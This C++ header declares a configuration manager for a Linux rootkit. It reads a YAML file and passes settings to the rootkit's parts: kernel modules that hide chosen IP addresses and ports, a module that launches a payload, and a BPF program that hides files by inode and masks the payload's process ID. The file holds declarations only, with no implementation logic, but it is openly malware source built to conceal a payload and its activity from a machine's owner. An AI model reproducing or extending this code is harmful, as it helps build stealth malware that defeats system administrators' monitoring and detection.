#ifndef ROOTKIT_CONFIG_MANGER_H
#define ROOTKIT_CONFIG_MANGER_H

#include <csignal>
#include <cstdint>
#include <optional>
#include <vector>
#include <string>
#include <yaml-cpp/yaml.h>

#define CONFIG_PATH "rt_conf.yaml"

namespace rootkit {

struct RnetConfig {
    std::string module_path;
    std::string module_name;
    std::vector<std::pair<std::string, uint16_t>> ips_and_ports = {
    };
};

struct RtConfig {
    std::string module_path;
    std::string module_name;
    // Params
    std::string program_cwd;
    std::string program_path;
};

struct RootkitBpfConfig {
    bool hide_host = false;
    bool hide_payload = false;
    bool hide_config = false;
    std::vector<uint64_t> inodes;
};

struct PayloadConfig {
    std::string path;
};

class ConfigManager {
private:
    bool is_config_ready;
    std::string config_path;
    pid_t payload_pid;
    RnetConfig rnetConf;
    RtConfig rtConf;
    RootkitBpfConfig bpfConf;
    PayloadConfig payloadConf;

public:
    /**
    * @brief Constructor, uses default config path
    * @param payload_pid Pid of the payload, used to configure masking its presence
    */
    ConfigManager(const pid_t payload_pid);

    /**
    * @brief Constructor
    * @param config_path Path to the config file
    * @param payload_pid Pid of the payload, used to configure masking its presence
    */
    ConfigManager(const std::string& config_path, const pid_t payload_pid);

    /**
    * @brief Reads config, and setup internal state
    * @return Returns true if reading was correct, and false if error happened
    */
    bool read();

    /**
     * @brief Add payload pid, to the configuration so it can be hidden by bpf
     * program. This cannot be done on read time because payload isn't running
     * at that moment, since payload also relies on this configuration reading.
     * @param pid Payload pid
     */
    void add_payload_pid(pid_t pid);

    /**
    * @brief Returns config for rt kernel module.
    * @return Returns nullopt if reading of config file wasn't successful,
    * otherwise returns config
    */
    std::optional<RtConfig> get_rt_config();

    /**
    * @brief Returns config for rnet kernel module. Set of ips and ports to hide.
    * @return Returns nullopt if reading of config file wasn't successful,
    * otherwise returns config
    */
    std::optional<RnetConfig> get_rnet_config();

    /**
    * @brief Returns config for bpf progrm, inodes to hide.
    * @return Returns nullopt if reading of config file wasn't successful,
    * otherwise returns config
    */
    std::optional<RootkitBpfConfig> get_bpf_config();

    /**
    * @brief Returns config for payload
    * @return Returns nullopt if reading of config file wasn't successful,
    * otherwise returns config
    */
    std::optional<PayloadConfig> get_payload_config();
};

}

#endif
